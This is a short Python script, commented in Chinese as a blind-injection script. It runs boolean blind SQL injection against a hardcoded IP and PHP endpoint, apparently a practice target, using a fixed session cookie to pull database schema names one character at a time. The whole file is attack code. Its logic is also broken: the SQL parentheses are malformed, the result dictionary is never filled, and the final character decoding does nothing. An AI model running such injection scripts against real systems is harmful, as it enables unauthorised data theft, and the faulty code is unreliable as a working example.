from urllib.parse import quote_plus
import requests


'''
盲注脚本
'''


url = 'http://113.108.70.111:61092/sqli4.php?id=1'
payload = ' and ascii(substr((select group_concat(schema_name) from information_schema.schemata,%s,1))=%s'
ascii2digit_list = [48, 49, 50, 51, 52, 53, 54, 55, 56 ,57, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, \
                    79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 95, 97, 98, 99, 100, 101, 102, 103, 104, 105, \
                    106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122]

headers = {
    "Cookie": "PHPSESSID=jcrf7mn2hpg0iqo0hejsh78hl0"
 }

data_list = []
dict_cnt = {}


def save_and_count(item):
    if item in dict_cnt:  # 直接判断key在不在字典中
        dict_cnt[item] += 1
    else:
        dict_cnt[item] = 1


def main():
    for index in range(2):
        for ascii2digit in ascii2digit_list:
            full_url = url + quote_plus(' and ascii(substr((select group_concat(schema_name) from information_schema.schemata,%s,1))=%s' % (index, ascii2digit))
            # full_url = quote_plus(full_url)
            req = requests.get(full_url, headers=headers)
            req_header = req.headers
            if 'content-length' in req_header.keys():
                # save_and_count(req_header['content-length'])
                print(req_header['content-length'])
                print(req.text)
                print(full_url)
            else:
                print('Can\'t get content-length')
        print(dict_cnt)

        min_value = min(dict_cnt.values())
        for key, value in dict_cnt.items():
            if value == min_value:
                print(chr(int()))

if __name__ == '__main__':
    main()
    # string = 'http://113.108.70.111:61092/sqli4.php?id=1 and ascii(substr((select group_concat(schema_name) from information_schema.schemata,0,1))=104'
    # print(quote_plus(string))

